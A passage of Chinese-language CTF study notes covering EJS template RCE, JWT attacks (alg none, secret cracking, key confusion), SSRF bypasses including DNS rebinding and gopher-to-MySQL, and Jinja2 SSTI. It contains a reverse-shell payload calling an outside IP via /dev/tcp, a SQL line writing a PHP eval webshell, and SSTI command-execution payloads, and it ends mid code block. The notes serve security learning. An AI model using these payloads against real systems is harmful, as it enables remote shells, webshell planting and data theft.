这里的compile很关键，它的作用是**输出解析后的html字符串，也就是可以解析字符串，那如果其中的参数可以构造，就可以实现远程rce**<br />语法:ejs.compile(str,options);
:::
| **参数** | **参数说明** |
| --- | --- |
| str | 这个是用来渲染的数据展示区域 |
| opstions | 这是个额外的参数配置,可以省略, |

- 然后跟进 complie 函数, 会发现有大量的渲染拼接,如果可以构造prended就可以rce
#### payload
```javascript
this.source = prepended + this.source + appended;
prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
```
所以让`opts.outputFunctionName`的值是：前后两个变量是为了闭合字符串
```shell
a=2333;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/121.36.96.230/2333 0>&1\"');var __tmp2
```

# 11. JWT
## 浏览器认证
### 传统的session认证：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675066407869-05311fff-c456-4b29-a0dd-3b976d05674b.png#averageHue=%23f8f6f5&clientId=ue76f3134-5f5a-4&from=paste&id=u4fd57ac6&originHeight=513&originWidth=1033&originalType=url&ratio=1&rotation=0&showTitle=false&size=269374&status=done&style=none&taskId=uce583a1c-30b4-4e0d-a0d8-35643a54cde&title=)

- Http不知道用户是谁
- 如果用户向服务器提供了用户名和密码来进行用户认证，下次请求时，用户还要再一次进行用户认证才行。因为根据http协议，服务器并不能知道是哪个用户发出的请求
- 所以服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,
- 以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了
> 缺点是：
> - 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大

### 基于token的鉴权机制

- 用户使用用户名密码来请求服务器
- 服务器进行验证用户的信息
- 服务器通过验证发送给用户一个token
- 客户端存储token，并在每次请求时附送上这个token值
- 服务端验证token值，并返回数据
:::info

- 同样是无状态的
- 不需要去考虑用户在哪一台服务器登录了
- token在每次请求时保存在请求头里
:::
### JWT(JSON Web Token)

- JWT 由  header + payload + signature构成

**header**<br />jwt的头部承载两部分信息：

- 声明类型，这里是jwt
- 声明加密的算法 通常直接使用 HMAC SHA256

完整的头部就像下面这样的JSON：
```json
{   
  'typ': 'JWT',   
  'alg': 'HS256' 
} 
```
然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.<br />eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 

- 这串密文就是对上面的内容进行base64的加密

**playload**

- 载荷就是存放有效信息的地方。这些有效信息包含三个部分
- 标准中注册的声明
- 公共的声明
- 私有的声明

**标准中注册的声明** (建议但不强制使用) ：

- **iss**: jwt签发者
- **sub**: jwt所面向的用户
- **aud**: 接收jwt的一方
- **exp**: jwt的过期时间，这个过期时间必须要大于签发时间
- **nbf**: 定义在什么时间之前，该jwt都是不可用的.
- **iat**: jwt的签发时间
- **jti**: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。

**公共的声明** 

- 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.

**私有的声明** 

- 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。

定义一个payload:
```javascript
{   
  "sub": "1234567890",  
  "name": "John Doe",  
  "admin": true 
} 
```
然后将其进行base64加密，得到Jwt的第二部分。

**signature**<br />该部分由3部分构成

- header (base64后的)
- payload (base64后的)
- secret

就是把base64_encode(header)和base64_encode(payload)结合，再用header中声明的加密方式进行加盐`secret`组合加密
```javascript
// javascript
var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);

var signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```
:::info

- secret是保存在服务器端的，jwt的签发生成也是在服务器端的
- **secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥**
- 在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。
:::

#### 应用

- 一般是在请求头里加入Authorization，并加上Bearer标注：
```javascript
fetch('api/user/1', {   
  headers: {     
    'Authorization': 'Bearer ' + token   
  } 
})
```
服务端会验证token，如果验证通过就会返回相应的资源,整个流程如下：
#### ![](https://cdn.nlark.com/yuque/0/2023/webp/29405061/1675065699096-e64a30df-773b-4fa6-b3a5-98de97d568ce.webp#averageHue=%23ededed&clientId=ue76f3134-5f5a-4&from=paste&id=u25ad5eb2&originHeight=673&originWidth=1200&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u31049ef1-9c3d-43de-b26a-58db6a06181&title=)
#### ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675066539108-d396363b-ffdb-4ffa-bf45-4067b4290285.png#averageHue=%238ab989&clientId=ue76f3134-5f5a-4&from=paste&id=u46659412&originHeight=433&originWidth=834&originalType=url&ratio=1&rotation=0&showTitle=false&size=209739&status=done&style=none&taskId=uf5964efd-196e-4fa1-8ebf-ef1e903b252&title=)<br />总结

- 因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。
- 因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。
- 便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。
- 它**不需要在服务端保存会话信息, **所以它易于应用的扩展
## 例题
[https://jwt.io/](https://jwt.io/)  破解jwt的各个部分
### web345(签名算法改为None）
#### 知识点
要注意使用 url 访问网页时

- /admin	表示访问 admin.php 文件
- /admin/	表示访问 admin/目录下的文件，默认是 index.php
#### 解题过程
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675067616061-f97a195d-d994-492a-84f5-ef7ea21cc7a9.png#averageHue=%23fcfbfa&clientId=ue76f3134-5f5a-4&from=paste&height=51&id=u925354e8&originHeight=102&originWidth=335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5157&status=done&style=none&taskId=u30edf148-f506-4feb-a7ca-da8a24cc6eb&title=&width=167.5)

- 题目提示访问/admin
- 查看application，发现cookie的值是jwt形式，base64解密
```json
{"alg":"None","typ":"jwt"}[{"iss":"admin","iat":1675067674,"exp":1675074874,"nbf":1675067674,"sub":"user","jti":"e90194a5df6f73dd6a943eaece490577"}]
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675150997901-fe253f92-3b19-45ef-b659-f02a7f5ebb3d.png#averageHue=%23fdfdfd&clientId=ue6fec3f1-2d6d-4&from=paste&height=559&id=u65d6b5fa&originHeight=1118&originWidth=2348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156327&status=done&style=none&taskId=uc85271ec-3df7-4a3d-9272-eb6730ee859&title=&width=1174)

- 这里是None发现没有加密，所以变成了 `header + payload + . `，也就是可以直接验证
- 将sub面向对象的user改为admin，我理解这里就是能访问admin的文件夹了
- 重新访问/admin/，Burp抓包拿到flag
### web346
:::info
JWT 支持将算法设定为 “None”。如果“alg” 字段设为“ None”，那么签名会被置空，这样任何 token 都是有效的。**用下面的代码试一下，确实signature是空的。**
:::
```python
import jwt

# payload
token_dict = {
  "iss": "admin",
  "iat": 1632670820,
  "exp": 1632678020,
  "nbf": 1632670820,
  "sub": "admin",
  "jti": "147cc3b129a041cdd38e3f127680d1e4"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  		# payload, 有效载体
                       "",  				# 进行加密签名的密钥
                       algorithm="none",  	 # 指明签名算法方式, 默认也是HS256
                       headers=headers 
                       # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )

print(jwt_token)
```
### web 347(弱口令)
[GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)

- 用这个工具爆破jwt的secret
### web349(RS256)

- 在jwt.io中解密

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675823672394-5bbc99a3-522c-4d85-b862-c7e1cb2d81ca.png#averageHue=%23fefdfd&clientId=u86d31080-b757-4&from=paste&height=341&id=ubdfed8ea&originHeight=682&originWidth=1873&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119375&status=done&style=none&taskId=u52065c2a-99b2-4808-97c7-92528b81784&title=&width=936.5)

- 发现是RS256，也就是signature是用rsa的私钥进行签名得到的
- 访问源码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675823633809-b671364f-87f7-4022-ad87-b64e1eb8dde3.png#averageHue=%23fdfcfb&clientId=u86d31080-b757-4&from=paste&height=358&id=u547000a5&originHeight=716&originWidth=1246&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75769&status=done&style=none&taskId=u096c5e81-7aea-4973-9edf-77d9457c740&title=&width=623)
:::info

- 以为这里的目录会是/public/private.key，但实际上是/private.key
- **所以还是要多试试**
:::

- 接着就是构造签名，直接用私钥生成即可，上脚本
```python
import jwt
public = open('private.key', 'r').read()
payload={"user":"admin"}
print(jwt.encode(payload, key=public, algorithm='RS256'))
# python2运行
```
### web 350(密钥混淆攻击)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675825078342-71521ebe-3224-477c-9813-ae1ff639523e.png#averageHue=%231f1f1e&clientId=u86d31080-b757-4&from=paste&height=662&id=uf6acbb1e&originHeight=1324&originWidth=1667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=229751&status=done&style=none&taskId=u72b7eb0a-1c86-48e9-84c9-fd48d817af4&title=&width=833.5)

- 查看源码和上一个题一样
- 但是这里我**只能获取公钥，不能获取私钥**
:::info

1.  把RS256改成HS256，这样就是对称的了
2. 用public.key对payload签名
3. 由于是对称的且server已知public.key，它会用public.key验证，攻击成功
:::
#### 防御方法

- JWT配置应该只允许使用HMAC算法或公钥算法，决不能同时使用这两种算法
# 12. SSRF
## web351
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675839966505-0f898737-c69c-41bc-8c67-4a9ae770b86e.png#averageHue=%23fefefe&clientId=u8bc4fad2-0104-4&from=paste&height=185&id=ub9950e8f&originHeight=370&originWidth=727&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37992&status=done&style=none&taskId=u64e9e08a-82de-41d1-8b10-ea946ddc6f8&title=&width=363.5)

- 这里猜测可能有一个flag.php的页面
- 直接访问会报错

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675840019616-4684b051-4cb1-4f92-82a7-2f8bab35df4e.png#averageHue=%23f5f4f2&clientId=u8bc4fad2-0104-4&from=paste&height=58&id=u8ba057a7&originHeight=116&originWidth=359&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5748&status=done&style=none&taskId=u52af5787-d8fe-44eb-92eb-9ce6b713723&title=&width=179.5)

- post提交 url=127.0.0.1/flag.php，即可访问
## web352(过滤127.0.0.1)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675840568170-06d1cf9f-85ea-4715-b3d9-6cfed1bc8610.png#averageHue=%23fefdfd&clientId=u8bc4fad2-0104-4&from=paste&height=315&id=u504ad8ea&originHeight=629&originWidth=681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61195&status=done&style=none&taskId=u852c4358-b2f2-412d-935b-8fb48cdd9e0&title=&width=340.5)
### 方法1：

- 用127.0.1 、127.1代替
:::info
127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：<br />[http://127.0.0.1](http://127.0.0.1) <br />[http://localhost](http://localhost) <br />[http://127.255.255.254](http://127.255.255.254) <br />127.0.0.1 - 127.255.255.254 <br />http://[::1] <br />http://[::ffff:7f00:1] <br />http://[::ffff:127.0.0.1] <br />[http://127.1](http://127.1) <br />[http://127.0.1](http://127.0.1) <br />[http://0:80](http://0:80)<br />[http://sudo.cc](http://sudo.cc)  会解析到127.0.0.1的域名<br />另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。
:::
### 方法2：
[IP地址进制转换](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

- 转成16进制 2进制
:::info
[http://0x7F000001/flag.php](http://0x7F000001/flag.php)  16进制加前缀0x<br />[http://0177.000.000.001/flag.php](http://0177.000.000.001/flag.php) 8进制加前缀0<br />[http://2130706433/flag.php](http://2130706433/flag.php) 10进制无前缀<br />目前测试2进制不行
:::
### parse_url
[PHP: parse_url - Manual](https://www.php.net/manual/zh/function.parse-url.php)

- 它会解析url中的各个部分,当没有后面的参数只有url时，会输出数组
```php
<?php
$url = 'http://username:password@hostname:9090/path?arg=value#anchor';
var_dump(parse_url($url));
?>
```

- 上面例子是一个完整的url
:::info

1. scheme: http或者https 协议名称
2. host: 匹配最后一个@后面符合格式的host
3. [user] username		@前
4. [pass] => password	@前
5. [path] => /path		/
6. [query] => arg=value	?以后的key=value
7. [fragment] => anchor	#以后的部分
:::

- 输出结果为：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675841249074-f463e4f4-b902-41f3-bb53-b353f38ec787.png#averageHue=%23fefefd&clientId=u8bc4fad2-0104-4&from=paste&height=439&id=uc1ca874a&originHeight=877&originWidth=672&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78892&status=done&style=none&taskId=uc334a802-c7a7-4f22-ae57-a8b03a8fe01&title=&width=336)
## web354（过滤）

- 用`http://sudo.cc/flag.php`绕过
- 或者自己买个域名改一下A记录，使自己的域名DNS解析为127.0.0.1也可以绕过
## web356(host长度小于3)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675842767577-736bcc57-7b67-4369-bde8-e51dcf73942f.png#averageHue=%23fefdfc&clientId=udb6cbca1-64c3-4&from=paste&height=169&id=u5a777858&originHeight=337&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44488&status=done&style=none&taskId=u6f3ed74b-3967-4dc2-b5a0-604ace60635&title=&width=347.5)

- 用0绕过
:::info
url=[http://0/flag.php](http://0/flag.php)

- 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0
:::

## web 357(DNS重绑定漏洞)
### DNS重绑定
[浅谈DNS重绑定漏洞](https://zhuanlan.zhihu.com/p/89426041)
#### DNS TTL
当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。
#### DNS Rebinding
在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。

- 对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；
- 然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。
### CTF实战应用
```php
$dst = @$_GET['KR'];
$res = @parse_url($dst);
$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
...
$dev_ip = "54.87.54.87";
if($ip === $dev_ip) {
    $content = file_get_contents($dst);
    echo $content;
}
```

- 这里想让我的ip必须是54.87.54.87，这样我就没法拿到内网的数据

[https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg](https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg)

- 该网站可以给一个域名绑定两个ip，每次是哪个ip是随机的
- 这样我设置一个`54.87.54.87`和一个`127.0.0.1`，这就有几率绕过if，从而拿到数据
### ctfshow web 257
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675859244615-1177f6fb-e84b-4c0f-8539-60f73efad981.png#averageHue=%23fefefe&clientId=u3e1739e4-bb48-4&from=paste&height=293&id=u7c99c3c8&originHeight=585&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55022&status=done&style=none&taskId=ue750d911-50c9-471a-a59f-79895c866c9&title=&width=667.5)
#### filter_var

- 过滤器
:::info
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。<br />FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。<br />FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（ 192.168.0.1在这个范围）。<br />FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。
:::
#### payload

- 这就要求得是合法ip，随便在那个网站上绑一个ip，和一个127.0.0.1
- 提交Payload`url=http://7f000001.7c7d1401.rbndr.us/flag.php`
- 浏览器在访问该域名时会随机的解析一种ip
## web 358(parse_url各个部分的含义)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675860496362-9485be17-b712-42f2-8e1a-4715314a2e63.png#averageHue=%23fefefd&clientId=u3e1739e4-bb48-4&from=paste&height=127&id=ufb7b3c39&originHeight=253&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27530&status=done&style=none&taskId=u69833120-985c-43bf-a79c-793f4923d7e&title=&width=342.5)

- 这里要求的格式是`http://ctf.xxxxxxshow`，中间可以是任意字符
- 由于解析后的host是@后的内容，path是/path的内容，query是?后的内容，构造Payload

`http://ctf.@127.0.0.1/flag.php?show`
## web 359(gopher打mysql)
### gohper
[Gopher协议在SSRF漏洞中的深入研究（附视频讲解）](https://zhuanlan.zhihu.com/p/112055947)

- gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。
- 使用tcp70端口。
#### gopher发送请求

- 首先nc启动监听,监听2333端口：
```shell
nc -lp 2333
```

- 使用curl发送http请求，命令为
```shell
curl gopher://192.168.0.119:2333/abcd
```

- 此时主机收到的消息是 `bcd`,a没有被接收
- 在使用gopher协议时在**url后加入一个字符，通常是下划线_**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677635989533-eec027bb-101d-4a0e-899b-73a25ddef892.png#averageHue=%23292b35&clientId=u5d8b8ac7-3f70-4&from=paste&height=76&id=ud1389503&originHeight=152&originWidth=860&originalType=binary&ratio=2&rotation=0&showTitle=false&size=16622&status=done&style=none&taskId=u8283bdf7-79e2-4926-8546-5686bf80f82&title=&width=430)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677636007383-b180f7a8-203c-4581-b3d7-a66dee707d3c.png#averageHue=%23292c36&clientId=u5d8b8ac7-3f70-4&from=paste&height=142&id=u874dfe32&originHeight=283&originWidth=1119&originalType=binary&ratio=2&rotation=0&showTitle=false&size=86314&status=done&style=none&taskId=u2c140656-d3e8-4336-a863-85e9b0e3dd5&title=&width=559.5)

- 此时两终端之间可以发消息
#### gopher发送get请求
:::info
1、构造HTTP数据包<br />2、URL编码、替换回车换行为%0d%0a<br />3、发送gopher协议
:::


**get型的http包**
```http
GET /ssrf/a.php?name=Margin HTTP/1.1
Host: 192.168.56.128
```

- url编码：
```http
GET%20%2Fssrf%2Fa.php%3Fname%3DMargin%20HTTP%2F1.1%0d%0AHost%3A%20192.168.56.128%0d%0A
```

- gopher发送:
```http
curl gopher://192.168.56.128:2333/_GET%20%2Fssrf%2Fa.php%3Fname%3DMargin%20HTTP%2F1.1%0d%0AHost%3A%20192.168.56.128%0d%0A
```
#### 
#### post类型的http包

- post包中这4个参数是必须的
```http
POST /ssrf/post.php HTTP/1.1
host:192.168.56.128
Content-Type:application/x-www-form-urlencoded
Content-Length:11

name=Margin
```

- gopher发送
```http
curl gopher://192.168.56.128:2333/_POST%20%2Fssrf%2Fpost.php%20HTTP%2F1.1%0d%0Ahost%3A192.168.56.128%0d%0AContent-Type%0d%0Aapplication%2Fx-www-form-urlencoded%0d%0AContent-Length%3A11%0d%0A%0d%0Aname%3DMargin%0d%0A
```
#### 
#### 
#### 
#### SSRF中使用gopher协议

1. 先准备了一个带有ssrf漏洞的页面curl_exec.php，代码如下：
```php
<?php     
  $url = $_GET['url'];     
	$curlobj = curl_init($url);     
	echo curl_exec($curlobj); 
?>
```

2. 在机器A上开启了一个监听nc -lp 666，然后在浏览器中访问

`[http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc](http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc)`

3. 机器A中收到消息abc

**ssrf + gopher获取shell**

- 准备一个get.php的页面
```php
<?php
    echo "Hello ".$_GET["name"]."\n"
?>
```

- 组成数据包

`[http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A](http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A)`
:::info
这个数据包的理解是

- curl_exec.php中存在ssrf漏洞，可以利用gopher协议
- 用gopher协议向get.php界面发送一个HTTP数据包，数据包中包括name=Margin等信息
:::

- 这里发现请求失败了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675865975357-a4808b79-bda3-4a41-8b76-c198f393a866.png#averageHue=%23f4f4f4&clientId=u3e1739e4-bb48-4&from=paste&id=u5eea6200&originHeight=151&originWidth=2243&originalType=url&ratio=1&rotation=0&showTitle=false&size=111825&status=done&style=none&taskId=u144a60c8-f62a-4e02-bb58-cd3d34304ea&title=)

- 因为PHP在接收到参数后会做一次URL的解码，解码后就破坏了数据包的格式。这样我就对下划线_后面的内容再进行一次url编码，这样就可以保证GET数据包的格式
```php
<?php     
  $url = $_GET['url'];     
	$curlobj = curl_init($url);     
	echo curl_exec($curlobj); 
/*
$curlobj 应该满足下面的格式
gopher://192.168.0.109:80/_GET /ssrf/base/get.php?name=Margin HTTP/1.1
Host: 192.168.0.109
*/
?>
```

- 后续过程见上面文章
### ctfshow web359

- 抓包发现returl，可能存在ssrf

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675864722199-24b12ee7-6de9-416c-a810-b40db7678a88.png#averageHue=%23d0cfcf&clientId=u3e1739e4-bb48-4&from=paste&id=ub927e1eb&originHeight=614&originWidth=2016&originalType=url&ratio=1&rotation=0&showTitle=false&size=173200&status=done&style=none&taskId=u0d921de0-33a0-42ac-84fb-a44956ff086&title=)

- 使用gopherus工具
- `python2 gopherus.py `启动程序
- 输入mysql的一句话木马：`select "<?php eval($_POST[1]);?>" into outfile '/var/www/html/2.php'`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675866582690-2aabc4b9-9d20-4977-a532-10ea975b135d.png#averageHue=%232f333e&clientId=u3e1739e4-bb48-4&from=paste&height=66&id=u0cb834a5&originHeight=131&originWidth=1523&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42579&status=done&style=none&taskId=uc329f1ce-52ae-46cf-ac14-f90a5304efb&title=&width=761.5)

- 对下划线后面的内容再次进行url编码，替换抓包后returl中的内容

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675866665045-ae1d6722-bc25-4b6a-b0cb-9ecb99545ad1.png#averageHue=%23343944&clientId=u3e1739e4-bb48-4&from=paste&height=146&id=uca4d2d82&originHeight=292&originWidth=2355&originalType=binary&ratio=1&rotation=0&showTitle=false&size=165161&status=done&style=none&taskId=ua1b5a2ed-ea90-4951-b510-327acf3a34f&title=&width=1177.5)

- 访问2.php，蚁剑连接getshell
# 13. SSTI(Server-Side Template Injection)
## 参考文章
:::info
写在前面

- **这做题一定要在本地多试，试试就知道为啥有的命令不行了**
:::
[细说Jinja2之SSTI&bypass - 合天网安实验室 - 博客园](https://www.cnblogs.com/hetianlab/p/14154635.html)<br />[flask之ssti模版注入从零到入门 - 先知社区](https://xz.aliyun.com/t/3679)<br />[SSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti绕过](https://blog.csdn.net/miuzzx/article/details/110220425)<br />[CTFSHOW SSTI篇_yu22x的博客-CSDN博客_ctfshow ssti](https://blog.csdn.net/miuzzx/article/details/112168039)
## SSTI漏洞成因
### 模板引擎

- 拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器
#### 后端渲染

- 后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的
- 后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。
#### 前端渲染

- 前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，
- 好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。
### SSTI(服务端模板注入)

- 有点像sql注入，服务器信任用户的输入，我传进去的代码`{{7*7}}`被执行了
#### route路由
```python
@app.route('/')
def test()"
   return 123
```

- 访问127.0.0.1:5000/则会输出123

**设置动态网址**
```python
@app.route("/hello/<username>")
def hello_user(username):
  return "user:%s"%username
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675996057127-ac4d2d55-5ec1-4942-8499-1bc4810685ef.png#averageHue=%23efeeed&clientId=u299d245d-6368-4&from=paste&height=122&id=u2933c79f&originHeight=244&originWidth=849&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28868&status=done&style=none&taskId=u65610fe1-1e2c-43fe-a2be-206e58f74c5&title=&width=424.5)
#### main入口
```python
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
```

- 开启debug后`app.debug = True`，修改代码的时候直接保存，网页刷新就可以了。
- 不用一次一次重启服务器
#### 模板渲染
:::info
├── app.py   <br />├── static   <br />│   └── style.css   <br />└── templates       <br />└── index.html
:::

- render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量
- 写一个index.html文件写templates文件夹中
```html
<html>
  <head>
    <title>{{title}} - 小猪佩奇</title>
  </head>
 <body>
      <h1>Hello, {{user.name}}!</h1>
  </body>
</html>
```

- 里面有两个参数需要我们渲染，user.name，以及title
- 在app.py文件里进行渲染
```python
@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
   user = {'name': '小猪佩奇'}#传入一个字典数组
   return render_template("index.html",title='Home',user=user)
```

- 这里没有任何过滤，所以就会造成问题
### flask实战

- 一段有漏洞的代码：
```python
● 
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)

if __name__ == '__main__':
    app.debug = True
    app.run()
```

- 这里用了`% (name)`，也就是会把用户的输入直接在前端显示结果，没有过滤下·
## 常用脚本

- 寻找类及下标
```python
import json

a = """
[<class 'type'>,..........,<class 'contextlib._BaseExitStack'>]
"""    #将一大堆类结果复制到这儿

num = 0
allList = []

result = ""
#下面的目的是把字典中的数据放入list中，result是查询的单个结果
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if "system" in v:       #在类中寻找‘system’类，注意区分大小写！
        print(str(k)+"--->"+v)
```

- 寻找函数脚本
```python
#寻找函数脚本：

import json 
search ='popen'     #在类中寻找popen函数
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try :
        if search in i.__init__.__globals__.keys():
            print(i,num)
    except:
        pass
```
## web 361

- 找`os._wrap_close`这个类，用脚本跑
- 找到位置后用下面的Payload
```python
{{"".__class__.__bases__[0].__subclasses__()[位置].__init__.__globals__['popen']('cat /flag').read()}}
```
## web 362
### 方法1：url_for

- 利用视图函数名字一般不会改变的特性，利用视图函数的名字去动态精准的获取url
```python
from flask import Flask, url_for
 
app = Flask(__name__)
app.config.update(DEBUG=True)
 
 
@app.route('/')
def demo1():
    print(url_for("book"))  # 注意这个引用的是视图函数的名字 字符串格式,就是下面的book函数，
    print(type(url_for("book")))
 
    return url_for("book")
 
 
@app.route('/book_list/')
def book():
    return 'flask_book'
 
 
if __name__ == "__main__":
    app.run()
```

- 终端中打印的结果为：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676014020303-cb098f20-e314-465d-8da7-5e310058f40d.png#averageHue=%23282726&clientId=u34e1e24c-4d73-4&from=paste&height=51&id=O21WG&originHeight=102&originWidth=383&originalType=binary&ratio=2&rotation=0&showTitle=false&size=6034&status=done&style=none&taskId=u02355a58-6c7a-4120-83b3-c6db6eb57c9&title=&width=191.5)
#### payload1
```python
?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```
#### payload2

- 也可以不用__builtins__，直接用os

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676016681161-ade63a58-28c8-4c96-969e-c99026af5407.png#averageHue=%23edeceb&clientId=u34e1e24c-4d73-4&from=paste&height=55&id=u140b4125&originHeight=109&originWidth=1127&originalType=binary&ratio=2&rotation=0&showTitle=false&size=12675&status=done&style=none&taskId=uc50bc29d-7268-45cb-a6d3-35a62a5386b&title=&width=563.5)
```python
url_for.__globals__['os']['poen']('cat /flag').read()
```
### 方法2：x.__init__

- x是任意26个英文字母的任意组合都可以，同样可以得到__builtins__然后用eval就可以了
```python
